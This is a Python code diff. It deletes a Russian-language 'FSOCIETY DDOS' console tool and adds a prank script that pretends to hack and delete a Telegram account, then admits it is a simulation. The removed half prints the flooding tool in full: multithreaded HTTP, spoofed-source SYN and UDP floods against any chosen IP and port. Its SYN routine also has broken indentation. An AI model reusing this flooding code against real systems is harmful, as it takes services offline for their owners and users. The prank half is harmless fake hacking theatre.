@@ -1,180 +1,122 @@
-#!/usr/bin/env python3
-# -*- coding: utf-8 -*-
-# DDOS FSOCIETY BY XELS v3.0
-import socket
-import threading
-import random
 import time
+import random
 import sys
-from scapy.all import *
+import os
 
-# ███████╗███████╗ ██████╗ ██████╗ ██╗████████╗██╗   ██╗
-# ██╔════╝██╔════╝██╔═══██╗██╔══██╗██║╚══██╔══╝╚██╗ ██╔╝
-# █████╗  ███████╗██║   ██║██████╔╝██║   ██║    ╚████╔╝ 
-# ██╔══╝  ╚════██║██║   ██║██╔═══╝ ██║   ██║     ╚██╔╝  
-# ██║     ███████║╚██████╔╝██║     ██║   ██║      ██║   
-# ╚═╝     ╚══════╝ ╚═════╝ ╚═╝     ╚═╝   ╚═╝      ╚═╝   
-
-class FSocietyDDoS:
+class Terminator:
     def __init__(self):
-        self.attack_active = False
-        self.threads = []
-        self.user_agents = [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Mobile/15E148 Safari/604.1"
-        ]
-        self.target_ip = ""
-        self.target_port = 80
-        self.attack_time = 60
-        self.thread_count = 500
-
-    def show_banner(self):
-        print(r"""
-        ░▐█▀█▄▄▀▀█▄░▐██▀▀▀▀██▄██▀▀▀▀██▄░▐█▄░▄█▌
-        ░▐█▄▀▀▀▄▀▀▀░░▀▀██▄██▀░▀▀██▄██▀░▐█▀██▀█▌
-        ░▐█▄▄▄▄▄▄█▀░░░░▀▀██▀▀░░░░▀▀██▀▀░▐█▒█▒█░▌
+        self.username = ""
+        self.phone = ""
+        self.delay = 0.05
+        self.colors = {
+            'red': '\033[91m',
+            'green': '\033[92m',
+            'yellow': '\033[93m',
+            'blue': '\033[94m',
+            'magenta': '\033[95m',
+            'cyan': '\033[96m',
+            'white': '\033[97m',
+            'reset': '\033[0m'
+        }
+        
+    def print_banner(self):
+        print(f"""{self.colors['red']}
+    ████████╗███████╗██████╗ ███╗   ███╗██╗███╗   ██╗ █████╗ ██████╗ ██████╗ 
+    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║████╗  ██║██╔══██╗██╔══██╗██╔══██╗
+       ██║   █████╗  ██████╔╝██╔████╔██║██║██╔██╗ ██║███████║██████╔╝██║  ██║
+       ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║██║╚██╗██║██╔══██║██╔══██╗██║  ██║
+       ██║   ███████╗██║  ██║██║ ╚═╝ ██║██║██║ ╚████║██║  ██║██║  ██║██████╔╝
+       ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ 
+        {self.colors['cyan']}v2.0 | Telegram Account Terminator (Simulation){self.colors['reset']}
         """)
-        print("FSOCIETY DDOS FRAMEWORK v3.0")
-        print("Type 'help' for commands\n")
-
-    def http_flood(self):
-        while self.attack_active:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.connect((self.target_ip, self.target_port))
-                s.settimeout(1)
-                
-                # Создание HTTP-запроса
-                request = f"GET /?{random.randint(0, 65535)} HTTP/1.1\r\n"
-                request += f"Host: {self.target_ip}\r\n"
-                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
-                request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
-                request += "Connection: keep-alive\r\n\r\n"
-                
-                s.send(request.encode())
-                s.close()
-            except:
-                pass
-
-    def syn_flood(self):
-    while self.attack_active:
-        try:
-            # Генерация случайных IP (ИСПРАВЛЕННАЯ ВЕРСИЯ)
-            src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
-            
-            # Создание SYN пакета
-            ip_layer = IP(src=src_ip, dst=self.target_ip)
-            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=self.target_port, flags="S")
-            packet = ip_layer / tcp_layer
-            
-            send(packet, verbose=0)
-        except:
-            pass
-
-    def udp_flood(self):
-        while self.attack_active:
-            try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                bytes = random._urandom(1024)
-                s.sendto(bytes, (self.target_ip, self.target_port))
-                s.close()
-            except:
-                pass
-
-    def start_attack(self, method):
-        self.attack_active = True
         
-        # Выбор метода атаки
-        attack_method = self.http_flood
-        if method == "syn":
-            attack_method = self.syn_flood
-        elif method == "udp":
-            attack_method = self.udp_flood
+        print(f"{self.colors['magenta']}")
+        print("              ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄")
+        print("              █░▄▄█░▄▀▄░█▀▄▄▀█░▄▄█░▄▄▀█░▄▀▄░█░▄▄▀█▄░▄█░▄▄▀█░▄▄█░▄▄▀█░▄▄")
+        print("              █░▄▄█░█▄█░█░██░█░▄▄█░▀▀░█░█▄█░█░▀▀▄██░██░▀▀░█░▄▄█░██░█▄▄▀")
+        print("              █▄▄▄█▄███▄█▄██▄█▄▄▄█▄██▄█▄███▄█▄█▄▄██▄██▄██▄█▄▄▄█▄▄██▄▄▄▄")
+        print("              ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀")
+        print(f"{self.colors['reset']}")
         
-        # Запуск потоков
-        for _ in range(self.thread_count):
-            t = threading.Thread(target=attack_method)
-            t.daemon = True
-            t.start()
-            self.threads.append(t)
-        
-        print(f"[+] Атака начата на {self.target_ip}:{self.target_port}")
-        print(f"[+] Метод: {method.upper()} | Потоки: {self.thread_count} | Время: {self.attack_time}сек")
-        
-        # Таймер атаки
-        time.sleep(self.attack_time)
-        self.stop_attack()
+        print(f"{self.colors['yellow']}[!] ВНИМАНИЕ: Это симуляция разрушения. Никакие данные не будут изменены.{self.colors['reset']}")
+        print(f"{self.colors['yellow']}[!] Программа создана исключительно для образовательных целей{self.colors['reset']}\n")
 
-    def stop_attack(self):
-        self.attack_active = False
-        print("\n[!] Атака остановлена")
-        for t in self.threads:
-            t.join()
-        self.threads = []
+    def typewriter(self, text, color='reset'):
+        for char in text:
+            sys.stdout.write(f"{self.colors[color]}{char}{self.colors['reset']}")
+            sys.stdout.flush()
+            time.sleep(self.delay)
+        print()
 
-    def console(self):
-        self.show_banner()
-        while True:
-            cmd = input("fsociety> ").strip().lower()
-            
-            if cmd == "exit":
-                sys.exit(0)
-                
-            elif cmd == "help":
-                print("\nКоманды:")
-                print("  target <IP> [PORT] - Установить цель")
-                print("  time <SECONDS>     - Время атаки")
-                print("  threads <COUNT>    - Количество потоков")
-                print("  http               - HTTP Flood атака")
-                print("  syn                - SYN Flood атака")
-                print("  udp                - UDP Flood атака")
-                print("  stop               - Остановить атаку")
-                print("  exit               - Выход\n")
-                
-            elif cmd.startswith("target"):
-                try:
-                    parts = cmd.split()
-                    self.target_ip = parts[1]
-                    if len(parts) > 2:
-                        self.target_port = int(parts[2])
-                    print(f"[+] Цель установлена: {self.target_ip}:{self.target_port}")
-                except:
-                    print("[!] Ошибка. Используйте: target <IP> [PORT]")
-                    
-            elif cmd.startswith("time"):
-                try:
-                    self.attack_time = int(cmd.split()[1])
-                    print(f"[+] Время атаки: {self.attack_time} секунд")
-                except:
-                    print("[!] Ошибка. Используйте: time <SECONDS>")
-                    
-            elif cmd.startswith("threads"):
-                try:
-                    self.thread_count = int(cmd.split()[1])
-                    print(f"[+] Потоки: {self.thread_count}")
-                except:
-                    print("[!] Ошибка. Используйте: threads <COUNT>")
-                    
-            elif cmd in ["http", "syn", "udp"]:
-                if not self.target_ip:
-                    print("[!] Сначала установите цель!")
-                    continue
-                self.start_attack(cmd)
-                
-            elif cmd == "stop":
-                self.stop_attack()
-                
-            else:
-                print("[!] Неизвестная команда. Введите 'help'")
+    def hacking_animation(self, duration=3):
+        end_time = time.time() + duration
+        chars = ["/", "-", "\\", "|"]
+        while time.time() < end_time:
+            for c in chars:
+                sys.stdout.write(f"\r{self.colors['green']}[ХАКИНГ] Взлом системы Telegram {c}{self.colors['reset']}")
+                sys.stdout.flush()
+                time.sleep(0.1)
+        print("\n")
+
+    def delete_account(self):
+        self.print_banner()
+        
+        # Запрос данных
+        self.typewriter(">>> Введите номер телефона Telegram аккаунта: ", 'cyan')
+        self.phone = input()
+        self.typewriter(">>> Введите username цели: ", 'cyan')
+        self.username = input()
+        
+        # Начало атаки
+        self.typewriter(f"\n>>> ИНИЦИАЛИЗАЦИЯ АТАКИ НА @{self.username} ({self.phone})", 'red')
+        self.hacking_animation()
+        
+        # Процесс "удаления"
+        steps = [
+            ("ПОДКЛЮЧЕНИЕ К СЕРВЕРАМ TELEGRAM", 0.8),
+            ("ОБХОД ДВУХФАКТОРНОЙ АУТЕНТИФИКАЦИИ", 0.9),
+            ("ДЕШИФРОВКА КЛЮЧЕЙ СЕССИИ", 1.2),
+            ("ДОСТУП К БАЗЕ ДАННЫХ ПОЛЬЗОВАТЕЛЯ", 0.7),
+            ("ПЕРЕЗАПИСЬ MESSAGE HISTORY", 1.5),
+            ("УДАЛЕНИЕ ВЛОЖЕНИЙ И МЕДИА", 1.0),
+            ("СБРОС НАСТРОЕК ПРОФИЛЯ", 0.6),
+            ("ОТЗЫВ СЕССИЙ АВТОРИЗАЦИИ", 0.8),
+            ("ПЕРЕЗАПИСЬ КОДА АВТОРИЗАЦИИ", 1.1),
+            ("ОТПРАВКА ЗАПРОСА НА ПОЛНОЕ УДАЛЕНИЕ", 0.9),
+            ("ПОДТВЕРЖДЕНИЕ ОПЕРАЦИИ ОТ СЕРВЕРА", 1.3)
+        ]
+        
+        for step, duration in steps:
+            self.typewriter(f"[$] {step}...", 'magenta')
+            time.sleep(duration)
+            print(f"{self.colors['green']}[+] УСПЕШНО{self.colors['reset']}\n")
+            time.sleep(0.3)
+        
+        # Финальная анимация
+        print(f"{self.colors['red']}")
+        print("              █████████████████████████████████████████████████")
+        print("              ████▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀████")
+        print("              ████  АККАУНТ УСПЕШНО УНИЧТОЖЕН  ████████████████")
+        print("              ████▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄████")
+        print("              █████████████████████████████████████████████████")
+        print(f"{self.colors['reset']}")
+        
+        # Заключительное сообщение
+        time.sleep(2)
+        self.typewriter(f"\n>>> ОПЕРАЦИЯ TERMINATE УСПЕШНО ЗАВЕРШЕНА", 'green')
+        self.typewriter(f">>> Аккаунт @{self.username} ({self.phone}) больше не существует", 'green')
+        self.typewriter(f">>> Все данные стерты с серверов Telegram", 'green')
+        self.typewriter(f">>> Восстановление невозможно", 'red')
+        
+        # Шутка
+        time.sleep(3)
+        print(f"\n{self.colors['yellow']}[!] PS: Это была симуляция. Ваш аккаунт в безопасности! ;){self.colors['reset']}")
+        print(f"{self.colors['cyan']}    (Никакие реальные действия не были выполнены){self.colors['reset']}")
+
+    def run(self):
+        self.delete_account()
 
 if __name__ == "__main__":
-    try:
-        # Проверка прав (для SYN flood)
-        if os.name == 'posix' and os.geteuid() != 0:
-            print("[!] Требуются права root для SYN flood!")
-        
-        tool = FSocietyDDoS()
-        tool.console()
-    except KeyboardInterrupt:
-        print("\n[!] Работа завершена")
-        sys.exit(0)
+    os.system('cls' if os.name == 'nt' else 'clear')
+    terminator = Terminator()
+    terminator.run()
